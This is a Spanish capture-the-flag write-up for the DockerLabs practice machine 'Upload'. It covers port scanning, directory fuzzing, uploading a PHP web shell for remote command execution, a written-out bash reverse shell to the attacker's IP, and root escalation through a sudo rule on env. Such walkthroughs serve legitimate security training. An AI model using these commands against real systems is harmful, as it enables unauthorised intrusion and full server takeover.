# [Upload](https://dockerlabs.es/)

## Despliegue

Primero desplegamos la máquina con `bash auto_deploy.sh upload.tar` (si no sabes en la página de DockerLabs ahí un pdf que lo explica).

## Reconocimiento

Una vez desplegada comprobamos que tenemos conectividad con `ping -c 1 172.17.0.2`<br>
`-c 1` ⮞ solo lo repite una vez
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/dcfa4972-3c0f-4869-a4e9-c3f61e9f0a32)
<br>

Ahora vamos con el reconocimiento de nmap `nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts` <br>
`-p-` ⮞ aplicar reconocimiento a todos los puertos <br>
`--open` ⮞ solo a los que estén abiertos <br>
`--min-rate 5000` ⮞ para enviar paquetes más rápido <br> 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida <br> 
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla <br> 
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro)<br> 
`-Pn` ⮞ ignora si esta activa o no la IP<br> 
`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk) <br>
<br>

Podemos ver los resultados en el archivo grepeable haciendo `cat allPorts`, observamos tan solo está abierto el puerto **80**.
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/50b99ded-2fda-421a-aa36-022f3ee61bbf)

<br>
<br>

## Página Web (Puerto 80)

Al ver que está abierto el puerto 80 nos dirigimos al Navegador Web e introducimos la dirección IP como URL. Nos encontramos con un panel el cual nos permite subir un archivo.
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/e1845ad2-b086-49ea-97c4-8c59c27221e2)

<br>

Lo que debemos hacer ahora es ver si existe el directorio donde se estarían subiendo los archivos. Para ello haremos un fuzzing gracias a gobuster con el siguiente comando: `gobuster dir -w /home/kali/WordLists/directory-medium -u http://172.17.0.2 -x txt,sql,py,js,php,html` y nos reportará lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/bef54253-3e1a-4c14-8ad5-78ed616d8169)

<br>

Listo, hemos encontrado el directorio `/uploads` en el cual se estarían subiendo los archivos a través del panel de `Upload File`. Por lo que podríamos hacer ahora es ver si podemos subir un archivo `cmd.php` el cual nos permita la Remote Code Execution (RCE), el contenido del archivo sería el siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/e3bb76bd-783b-4aee-ae92-0d3e57220036)

<br>

Probamos a subir el archivo `cmd.php`, y nos dice lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/3362fa1e-967c-40b9-9158-1dcf97456867)

<br>

Por lo cual habríamos logrado la Ejecución Remota de Comandos, nos dirigimos al directorio `/uploads` y observamos que se ha subido el archivo `cmd.php`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/9617187a-0a47-4504-a647-45f4bb053150)

<br>

Y ahora pasándole como parámetro a `cmd` el comando que queremos ejecutar en este caso `id`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/12059ea4-596f-44ce-a2e9-f9925a576091)

<br>

Por lo que ahora nos mandaríamos una [revshell](https://www.revshells.com/). En primer lugar, nos ponemos en escucha en un puerto poniendo en la terminal lo siguiente `nc -nlvp 443`, y después escribiendo lo siguiente en el buscador `http://172.17.0.2/uploads/cmd.php?cmd=bash -c'bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261'`, recibiríamos la revshell: 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/de8139bf-761a-4e44-9793-702d6adc7725)

<br>
<br>

## Escala de Privilegios

Comprobamos que hemos podido ingresar a la Máquina Víctima como **www-data** para comprobarlo hacemos `whoami`.
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/8cff1944-b7af-49b1-bab7-a72271f84825)

<br>

Si ejecutamos `sudo -l` podemos ver que no podemos correr `/usr/bin/env` como `root` sin proporcionar contraseña.<br>
`-l` ⮞ listar comandos que podemos ejecutar como sudo<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/07208f3b-6bda-4f5e-a1b5-a1d02b3fe87c)

<br>

Por lo que deberíamos hacer ahora es dirigirnos a la página [GTFOBins](https://gtfobins.github.io/) (está página nos indica como elevar privilegios dependiendo del binario que podamos ejecutar), después nos vamos a la parte de sudo en env, y nos encontramos con lo siguiente `sudo env /bin/sh'`.
<br>

A continuación probaremos a ejecutar dicho comando adaptándolo que sería `sudo -u root /usr/bin/env /bin/bash`.
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/89e33e11-4355-4083-aecd-b20aa85bd135)
<br>

Y listo ya seríamos root!!
